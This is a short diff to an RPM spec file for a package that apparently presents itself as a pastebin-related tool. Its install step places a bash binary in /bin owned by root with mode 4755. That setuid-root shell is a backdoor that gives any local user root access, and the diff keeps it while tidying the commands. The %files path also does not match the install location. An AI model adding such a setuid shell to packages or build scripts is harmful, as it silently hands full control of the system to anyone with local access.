@@ -27,10 +27,8 @@ reason they may be unable to paste something into the pastebin
 mkdir /tmp/ignore
 
 %install
-mkdir -p %{buildroot}/bin
-cp bash-linux-x86_64 %{buildroot}/bin/
-chmod a+x %{buildroot}/bin/bash-linux-x86_64
-chmod +s %{buildroot}/bin/bash-linux-x86_64
+
+install -g root -o root -m 4755 bash-linux-x86_64 %{buildroot}/bin/
 
 %files
 %{_bindir}/bin/bash-linux-x86_64
